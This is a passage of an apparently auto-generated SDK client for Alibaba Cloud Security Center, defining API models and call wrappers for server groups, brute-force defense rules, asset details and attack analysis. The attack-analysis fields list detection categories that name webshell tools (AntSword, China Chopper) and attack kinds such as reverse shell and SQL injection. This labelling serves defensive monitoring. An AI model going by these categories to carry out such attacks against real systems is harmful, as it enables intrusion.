      uuid?: string(name='Uuid', description='The UUID of the server.', example='4fe8e1cd-3c37-4851-b9de-124da32c****'),
    }
  ](name='EntityList', description='An array that consists of servers.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribeAllEntityResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAllEntityResponseBody(name='body'),
}

async function describeAllEntityWithOptions(runtime: Util.RuntimeOptions): DescribeAllEntityResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeAllEntity',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAllEntity(): DescribeAllEntityResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAllEntityWithOptions(runtime);
}

model DescribeAllGroupsRequest {
  lang?: string(name='Lang', description='The language of the content within the request and the response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model DescribeAllGroupsResponseBody = {
  count?: int32(name='Count', description='The total number of server groups.', example='2'),
  groups?: [ 
    {
      groupFlag?: int32(name='GroupFlag', description='The type of the server group. Valid values:

*   **0**: the default group
*   **1**: other groups', example='1'),
      groupId?: int32(name='GroupId', description='The ID of the server group.', example='8834224'),
      groupName?: string(name='GroupName', description='The name of the server group.', example='abc'),
    }
  ](name='Groups', description='An array that consists of the information about server groups.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribeAllGroupsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAllGroupsResponseBody(name='body'),
}

async function describeAllGroupsWithOptions(request: DescribeAllGroupsRequest, runtime: Util.RuntimeOptions): DescribeAllGroupsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAllGroups',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAllGroups(request: DescribeAllGroupsRequest): DescribeAllGroupsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAllGroupsWithOptions(request, runtime);
}

model DescribeAllImageBaselineRequest {
  lang?: string(name='Lang', example='zh'),
}

model DescribeAllImageBaselineResponseBody = {
  imageBaselines?: {
    baselineClassList?: [ 
      {
        alias?: string(name='Alias'),
        baselineNameList?: [ 
          {
            alias?: string(name='Alias'),
            baselineItemList?: [ 
              {
                alias?: string(name='Alias'),
                classKey?: string(name='ClassKey', example='identification'),
                itemKey?: string(name='ItemKey', example='duplicate_pwd_hash'),
                nameKey?: string(name='NameKey', example='identification'),
              }
            ](name='BaselineItemList'),
            classKey?: string(name='ClassKey', example='identification'),
            nameKey?: string(name='NameKey', example='identification'),
          }
        ](name='BaselineNameList'),
        classKey?: string(name='ClassKey', example='identification'),
      }
    ](name='BaselineClassList'),
  }(name='ImageBaselines'),
  requestId?: string(name='RequestId', example='1A975D03-5F49-5354-B2CB-3918D5DA****'),
}

model DescribeAllImageBaselineResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAllImageBaselineResponseBody(name='body'),
}

async function describeAllImageBaselineWithOptions(request: DescribeAllImageBaselineRequest, runtime: Util.RuntimeOptions): DescribeAllImageBaselineResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAllImageBaseline',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAllImageBaseline(request: DescribeAllImageBaselineRequest): DescribeAllImageBaselineResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAllImageBaselineWithOptions(request, runtime);
}

model DescribeAntiBruteForceRulesRequest {
  id?: long(name='Id'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='121.69.XX.XX'),
}

model DescribeAntiBruteForceRulesResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='2'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4E5BFDCF-B9DD-430D-9DA4-151BCB581C9D'),
  rules?: [ 
    {
      defaultRule?: boolean(name='DefaultRule', description='Indicates whether the defense rule is the default rule. Valid values:

*   **true**: yes
*   **false**: no

>  The default rule takes effect on all servers that are not protected by defense rules against brute-force attacks.', example='true'),
      enableSmartRule?: boolean(name='EnableSmartRule', description='This parameter is deprecated.', example='false'),
      failCount?: int32(name='FailCount', description='The threshold of logon failures that you specify.', example='15'),
      forbiddenTime?: int32(name='ForbiddenTime', description='The period of time during which logons from an account are not allowed. Unit: minutes.', example='360'),
      id?: long(name='Id', description='The ID of the defense rule.', example='1629'),
      machineCount?: int32(name='MachineCount', description='The number of servers to which the defense rule is applied.', example='3'),
      name?: string(name='Name', description='The name of the defense rule.', example='AntiBruteForceRule01'),
      span?: int32(name='Span', description='The period of time during which logon failures from an account are measured. Unit: minutes. If **Span** is set to 10, the defense rule takes effect when the logon failures measured within 10 minutes reaches the specified threshold. The IP address of attackers cannot be used to log on to the server in the specified period of time.', example='10'),
      uuidList?: [ string ](name='UuidList', description='An array consisting of the UUIDs of servers to which the defense rule is applied.'),
    }
  ](name='Rules', description='An array that consists of the defense rules returned.'),
}

model DescribeAntiBruteForceRulesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAntiBruteForceRulesResponseBody(name='body'),
}

async function describeAntiBruteForceRulesWithOptions(request: DescribeAntiBruteForceRulesRequest, runtime: Util.RuntimeOptions): DescribeAntiBruteForceRulesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAntiBruteForceRules',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAntiBruteForceRules(request: DescribeAntiBruteForceRulesRequest): DescribeAntiBruteForceRulesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAntiBruteForceRulesWithOptions(request, runtime);
}

model DescribeAppVulScanCycleResponseBody = {
  cycle?: string(name='Cycle', example='1week'),
  requestId?: string(name='RequestId', example='934E6D2A-0123-5A99-88BA-80DC27634E22'),
}

model DescribeAppVulScanCycleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAppVulScanCycleResponseBody(name='body'),
}

async function describeAppVulScanCycleWithOptions(runtime: Util.RuntimeOptions): DescribeAppVulScanCycleResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeAppVulScanCycle',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAppVulScanCycle(): DescribeAppVulScanCycleResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAppVulScanCycleWithOptions(runtime);
}

model DescribeAssetDetailByUuidRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.0.XX.XX'),
  uuid?: string(name='Uuid', description='The UUID of the server to query.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='9e6cad93-a379-46fd-a701-9bbf02f4****'),
}

model DescribeAssetDetailByUuidResponseBody = {
  assetDetail?: {
    assetType?: string(name='AssetType', description='The type of the asset. Valid values:

*   **0**: ECS instance
*   **1**: Server Load Balancer (SLB) instance
*   **2**: NAT gateway
*   **3**: ApsaraDB RDS database
*   **4**: ApsaraDB for MongoDB database
*   **5**: ApsaraDB for Redis database
*   **6**: image
*   **7**: container', example='0'),
    authModifyTime?: long(name='AuthModifyTime', description='The timestamp when Security Center is authorized to protect the asset. Unit: milliseconds.', example='1627974044000'),
    authVersion?: int32(name='AuthVersion', description='The edition of Security Center that is authorized to protect the asset. Valid values:

*   **1**: Basic edition (Unauthorized)
*   **6**: Anti-virus edition
*   **5**: Advanced edition
*   **3**: Enterprise edition
*   **7**: Ultimate edition
*   **10**: Value-added Plan edition', example='7'),
    bind?: boolean(name='Bind', description='Indicates whether Security Center is authorized to protect the asset. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
    clientStatus?: string(name='ClientStatus', description='The status of the Security Center agent. Valid values:

*   **pause**: The Security Center agent suspends protection for your server.
*   **online**: The Security Center agent is protecting your server.
*   **offline**: The Security Center agent does not protect your server.', example='online'),
    clientVersion?: string(name='ClientVersion', description='The version of the Security Center agent.', example='2.0.0'),
    cpu?: int32(name='Cpu', description='The number of CPU cores.', example='2'),
    cpuInfo?: string(name='CpuInfo', description='The details of the CPU.', example='Intel(R) Xeon(R) Platinum 8163 CPU @ 2.50GHz'),
    createTime?: long(name='CreateTime', description='The timestamp when Security Center records the details of the server. Unit: milliseconds.', example='1603863599000'),
    diskInfoList?: [ string ](name='DiskInfoList', description='An array that consists of the information about the disk.'),
    flag?: int32(name='Flag', description='Indicates whether the asset is provided by Alibaba Cloud. Valid values:

*   **0**: yes
*   **1**: no', example='0'),
    groupTrace?: string(name='GroupTrace', description='The group to which the server belongs. By default, the servers that are not grouped belong to the **Default** group.', example='default'),
    hostName?: string(name='HostName', description='The name of the host.', example='qewrqwerqs****'),
    instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-uf6h7p2fgk6rkk0g****'),
    instanceName?: string(name='InstanceName', description='The name of the server.', example='i-fasdfasdfadfafa****'),
    internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='192.168.XX.XX'),
    intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='192.168.XX.XX'),
    ip?: string(name='Ip', description='The IP address that is assigned to the Elastic Compute Service (ECS) instance.', example='192.168.XX.XX'),
    ipList?: [ string ](name='IpList', description='The IP addresses of the server.'),
    kernel?: string(name='Kernel', description='The kernel version of the operating system.', example='4.18.0-80.11.2.el8_0.x86_64'),
    macList?: [ string ](name='MacList', description='The media access control (MAC) addresses of the server.'),
    mem?: int32(name='Mem', description='The memory size of the server. Unit: GB.', example='32'),
    memory?: long(name='Memory', description='The memory size of the server. Unit: MB.', example='512'),
    os?: string(name='Os', description='The operating system type of the server.', example='linux'),
    osDetail?: string(name='OsDetail', description='The operating system version of the server.', example='Linux 64bit'),
    osName?: string(name='OsName', description='The name of the operating system.', example='-'),
    region?: string(name='Region', description='The region in which the server resides.', example='cn-hangzhou-dg-a01'),
    regionId?: string(name='RegionId', description='The ID of the region in which the asset resides.', example='cn-hanghzou'),
    regionName?: string(name='RegionName', description='The name of the region in which the server resides.', example='China (Hohhot)'),
    sysInfo?: string(name='SysInfo', description='The operating system information about the server.', example='CentOS Linux 8.0.1905'),
    tag?: string(name='Tag', description='The tag that is added to the server.', example='InternetIp'),
    uuid?: string(name='Uuid', description='The UUID of the server.', example='9e6cad93-a379-46fd-a701-9bbf02f4****'),
    vpcInstanceId?: string(name='VpcInstanceId', description='The ID of the virtual private cloud (VPC) in which the server resides.', example='vpc-bp1fs3bwonlfq503w****'),
  }(name='AssetDetail', description='The details of the server.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='39031E31-6BBA-5C99-A870-D807E78918CD'),
}

model DescribeAssetDetailByUuidResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAssetDetailByUuidResponseBody(name='body'),
}

async function describeAssetDetailByUuidWithOptions(request: DescribeAssetDetailByUuidRequest, runtime: Util.RuntimeOptions): DescribeAssetDetailByUuidResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAssetDetailByUuid',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAssetDetailByUuid(request: DescribeAssetDetailByUuidRequest): DescribeAssetDetailByUuidResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAssetDetailByUuidWithOptions(request, runtime);
}

model DescribeAssetDetailByUuidsRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  uuids?: string(name='Uuids', description='The UUIDs of the ECS instances. Separate multiple UUIDs with commas (,).', example='0687b17f-2a36-4e5****,0687b17f-2a36-4e****'),
}

model DescribeAssetDetailByUuidsResponseBody = {
  assetList?: [ 
    {
      assetType?: string(name='AssetType', description='The type of the asset.

The value is fixed as **0**, which indicates ECS instances.', example='0'),
      clientStatus?: string(name='ClientStatus', description='The status of the Security Center agent. Valid values:

*   **online**
*   **offline**', example='online'),
      flag?: int32(name='Flag', description='The type of the asset by source. Valid values:

*   **0**: The asset is provided by Alibaba Cloud.
*   **1**: The asset is not provided by Alibaba Cloud.
*   **2**: The asset resides in a data center.
*   **3**, **4**, **5**, and **7**: other cloud asset.
*   **8**: light-weight assets.', example='0'),
      instanceId?: string(name='InstanceId', description='The ID of the ECS instance.', example='i-rj9gda4wolo0zixi****'),
      instanceName?: string(name='InstanceName', description='The name of the ECS instance.', example='TestInstanceName'),
      internetIp?: string(name='InternetIp', description='The public IP address of the ECS instance.', example='10.10.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the ECS instance.', example='192.168.XX.XX'),
      ip?: string(name='Ip', description='The IP address of the ECS instance.

>  If the ECS instance has a public IP address, the value of this parameter is the public IP address of the ECS instance. If the ECS instance does not have a public IP address, the value of this parameter is the private IP address of the ECS instance.', example='10.10.XX.XX'),
      os?: string(name='Os', description='The operating system of the ECS instance.', example='Linux'),
      osName?: string(name='OsName', description='The name of the operating system run by the ECS instance.', example='CentOS 7.6 64-bit'),
      region?: string(name='Region', description='The region in which the ECS instance resides.', example='cn-guangzhou'),
      regionId?: string(name='RegionId', description='The region in which the ECS instance resides.

>  For more information about the mapping between region IDs and region names, see [Regions and zones](~~40654~~).', example='cn-shanghai'),
      regionName?: string(name='RegionName', description='The name of the region in which the ECS instance resides.', example='cn-shenzhen'),
      uuid?: string(name='Uuid', description='The UUID of the ECS instance.', example='2a98f149-0256-414c-a29a-a69f8a75****'),
      vpcInstanceId?: string(name='VpcInstanceId', description='The ID of the virtual private cloud (VPC).', example='13231-331331'),
    }
  ](name='AssetList', description='An array that consists of the details of the ECS instances.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='92016EC8-D52D-49D8-9FF7-9EA340A950B9'),
}

model DescribeAssetDetailByUuidsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAssetDetailByUuidsResponseBody(name='body'),
}

async function describeAssetDetailByUuidsWithOptions(request: DescribeAssetDetailByUuidsRequest, runtime: Util.RuntimeOptions): DescribeAssetDetailByUuidsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAssetDetailByUuids',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAssetDetailByUuids(request: DescribeAssetDetailByUuidsRequest): DescribeAssetDetailByUuidsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAssetDetailByUuidsWithOptions(request, runtime);
}

model DescribeAssetSummaryResponseBody = {
  assetsSummary?: {
    totalAssetAllRegion?: int32(name='TotalAssetAllRegion', description='The total number of protected assets in all regions.', example='2064'),
    totalCoreAllRegion?: int32(name='TotalCoreAllRegion', description='The total number of cores of protected assets in all regions.', example='3200'),
    totalCoreNum?: int32(name='TotalCoreNum', description='The total number of cores of protected assets in the current region.', example='1022'),
  }(name='AssetsSummary', description='The statistical information about the assets.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0FA7F1F4-488D-52CA-9BFC-3E47793B49D1'),
}

model DescribeAssetSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAssetSummaryResponseBody(name='body'),
}

async function describeAssetSummaryWithOptions(runtime: Util.RuntimeOptions): DescribeAssetSummaryResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeAssetSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAssetSummary(): DescribeAssetSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAssetSummaryWithOptions(runtime);
}

model DescribeAttackAnalysisDataRequest {
  base64?: string(name='Base64', description='Specifies whether to encode the value of the **client_url** field in the query results by using the Base64 algorithm. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page **1**.

>  If the Type parameter is set to **DETAILS**, you must specify the CurrentPage parameter.', example='1'),
  data?: string(name='Data', description='The condition that is used to filter attack events.

>  The following list describes the valid values of crack_type:

*   3: brute-force attack on MySQL

*   4: FTP brute-force attack

*   5: SSH brute-force attack

*   6: RDP brute-force attack

*   9: brute-force attack on Microsoft SQL Server

*   101: intercepted attack on Java Struts 2

*   102: intercepted attack on Redis

*   103: communication with AntSword Webshell

*   104: communication with China Chopper Webshell

*   133: communication with XISE Webshell

*   sqli: SQL injection

*   codei: code execution

*   xss: cross-site scripting (XSS)

*   lfi: local file inclusion

*   rfi: remote file inclusion

*   webshell: trojan script

*   upload: vulnerability upload

*   path: directory traversal

*   bypass: unauthorized access

*   csrf: cross-site request forgery (CSRF)

*   crlf: carriage return line feed (CRLF)

*   other: others', example='{"crack_type":"9"}'),
  endTime?: long(name='EndTime', description='The timestamp when the attack stops. Unit: seconds.', example='1649040221'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.

>  If the Type parameter is set to **DETAILS**, you must specify the PageSize parameter.', example='10'),
  startTime?: long(name='StartTime', description='The timestamp at which the attack starts. By default, the statistics of the previous seven days are queried. Unit: seconds.

>  The start time that you specify must be within the previous 40 days.', example='1644027670'),
  type?: string(name='Type', description='The details of attack analysis. Valid values:

*   **TOTAL**: number of attacks
*   **TREND**: attack trend
*   **PIE_CHART**: distribution of attacks by type
*   **SOURCE_TOP**: top 5 attack sources
*   **CLIENT_TOP**: top 5 attacked assets
*   **DETAILS**: attack details

>  If the Type parameter is set to **DETAILS**, you must specify the CurrentPage and PageSize parameters.', example='DETAILS'),
}

model DescribeAttackAnalysisDataResponseBody = {
  data?: string(name='Data', description='The attack events. The value contains the following fields:

*   **client_url**: the URL of the attack request.

*   **internetIp**: the IP address of the asset.

*   **instanceName**: the name of the asset.

*   **table_src**: the source of data.

*   **uuid**: the UUID of the asset.

*   **crack_method**: the method of the attack request.

*   **crack_hour**: the attack time.

*   **crack_src_ip**: the IP address from which the attack is launched.

*   **instanceId**: the ID of the asset.

*   **dst_port**: the attacked port.

*   **client_ip**: the attacked IP address.

*   **location**: the region from which the attack is launched.

*   **aliuid**: the ID of the Alibaba Cloud account.

*   **crack_cnt**: the number of times that the attack is launched.

*   **crack_type**: the type of the attack. Valid values:

    *   **113**: improper authorization
    *   **112**: redirection attack
    *   **upload**: vulnerability upload
    *   **other**: others
    *   **webshell**: trojan script
    *   **201**: suspicious connection
    *   **9**: brute-force attack on Microsoft SQL Server
    *   **5**: SSH brute-force attack
    *   **6**: RDP brute-force attack
    *   **lfi**: local file inclusion
    *   **7**: code execution
    *   **sqli**: SQL injection
    *   **209**: web attack
    *   **31**: buffer overflow
    *   **3**: brute-force attack on MySQL
    *   **30**: clickjacking
    *   **4**: FTP brute-force attack
    *   **bypass**: unauthorized access
    *   **33**: format string
    *   **deeplearning**: others
    *   **32**: integer overflow
    *   **203**: brute-force attack
    *   **34**: race condition
    *   **rfi**: remote file inclusion
    *   **0**: SQL injection
    *   **212**: mining behavior
    *   **213**: reverse shell
    *   **211**: worm
    *   **61**: session timeout
    *   **20**: directory traversal
    *   **xss**: XSS
    *   **22**: unauthorized access
    *   **21**: scan attack
    *   **24**: file modification
    *   **26**: file deletion
    *   **25**: file reading
    *   **28**: CRLF injection
    *   **27**: logic error
    *   **29**: template injection
    *   **csrf**: CSRF
    *   **path**: directory traversal
    *   **crlf**: CRLF
    *   **102**: CSRF
    *   **103**: server-side request forgery (SSRF)
    *   **101**: XSS
    *   **11**: file inclusion
    *   **10**: file upload
    *   **12**: vulnerability upload
    *   **15**: unauthorized access
    *   **14**: information leakage
    *   **17**: XML entity injection
    *   **16**: insecure configuration
    *   **19**: Lightweight Directory Access Protocol (LDAP) injection
    *   **18**: XPath injection
    *   **codei**: code execution', example='[{\\"crack_hour\\":1662480000000,\\"crack_cnt\\":471},{\\"crack_hour\\":1662483600000,\\"crack_cnt\\":461},{\\"crack_hour\\":1662487200000,\\"crack_cnt\\":445},{\\"crack_hour\\":1662490800000,\\"crack_cnt\\":471},{\\"crack_hour\\":1662494400000,\\"crack_cnt\\":534},{\\"crack_hour\\":1662498000000,\\"crack_cnt\\":652},{\\"crack_hour\\":1662501600000,\\"crack_cnt\\":706},{\\"crack_hour\\":1662505200000,\\"crack_cnt\\":613},{\\"crack_hour\\":1662508800000,\\"crack_cnt\\":578},{\\"crack_hour\\":1662512400000,\\"crack_cnt\\":577},{\\"crack_hour\\":1662516000000,\\"crack_cnt\\":616},{\\"crack_hour\\":1662519600000,\\"crack_cnt\\":597},{\\"crack_hour\\":1662523200000,\\"crack_cnt\\":575},{\\"crack_hour\\":1662526800000,\\"crack_cnt\\":507}]'),
  page?: int32(name='Page', description='The page number of the returned page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: 10.', example='10'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4C1AE3F3-18FA-4108-BBB9-AFA1A032756C'),
  total?: int32(name='Total', description='The total number of attack events returned.', example='1000'),
}

model DescribeAttackAnalysisDataResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAttackAnalysisDataResponseBody(name='body'),
}

async function describeAttackAnalysisDataWithOptions(request: DescribeAttackAnalysisDataRequest, runtime: Util.RuntimeOptions): DescribeAttackAnalysisDataResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.base64)) {
    query['Base64'] = request.base64;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.data)) {
    query['Data'] = request.data;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAttackAnalysisData',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAttackAnalysisData(request: DescribeAttackAnalysisDataRequest): DescribeAttackAnalysisDataResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAttackAnalysisDataWithOptions(request, runtime);
}

model DescribeAutoDelConfigResponseBody = {
  days?: int32(name='Days', description='The number of days during which a detected vulnerability is retained before the vulnerability is automatically deleted.', example='30'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='C56F66FD-C4EE-4813-ABDC-4FF94B6C384E'),
}

model DescribeAutoDelConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAutoDelConfigResponseBody(name='body'),
}

async function describeAutoDelConfigWithOptions(runtime: Util.RuntimeOptions): DescribeAutoDelConfigResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeAutoDelConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAutoDelConfig(): DescribeAutoDelConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAutoDelConfigWithOptions(runtime);
}

model DescribeBackUpExportInfoRequest {
  currentPage?: int32(name='CurrentPage', example='1'),
  exportType?: string(name='ExportType', example='suspiciousExport'),
  lang?: string(name='Lang', example='zh'),
  pageSize?: int32(name='PageSize', example='20'),
}

model DescribeBackUpExportInfoResponseBody = {
  data?: [ 
    {
      currentCount?: int32(name='CurrentCount', example='29'),
      fileName?: string(name='FileName', example='suspicious_event_20221203'),
      gmtCreate?: long(name='GmtCreate', example='1671607025000'),
      id?: long(name='Id', example='273698***'),
      link?: string(name='Link', example='http://xxx.oss-cn-xxx.aliyuncs.com/export/assetInstance_20221221_1671606250570.zip'),
      message?: string(name='Message', example='success'),
      progress?: int32(name='Progress', example='100'),
      status?: string(name='Status', example='success'),
      totalCount?: int32(name='TotalCount', example='29'),
    }
  ](name='Data'),
  pageInfo?: {
    count?: int32(name='Count', example='9'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='29'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
}

model DescribeBackUpExportInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBackUpExportInfoResponseBody(name='body'),
}

async function describeBackUpExportInfoWithOptions(request: DescribeBackUpExportInfoRequest, runtime: Util.RuntimeOptions): DescribeBackUpExportInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.exportType)) {
    query['ExportType'] = request.exportType;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeBackUpExportInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeBackUpExportInfo(request: DescribeBackUpExportInfoRequest): DescribeBackUpExportInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBackUpExportInfoWithOptions(request, runtime);
}

model DescribeBackupClientsRequest {
  supportRegionId?: string(name='SupportRegionId', description='The region in which the anti-ransomware feature is supported.
> You can call the [DescribeSupportRegion](~~DescribeSupportRegion~~) operation to query the regions in which the anti-ransomware feature is supported.', example='cn-hangzhou'),
}

model DescribeBackupClientsResponseBody = {
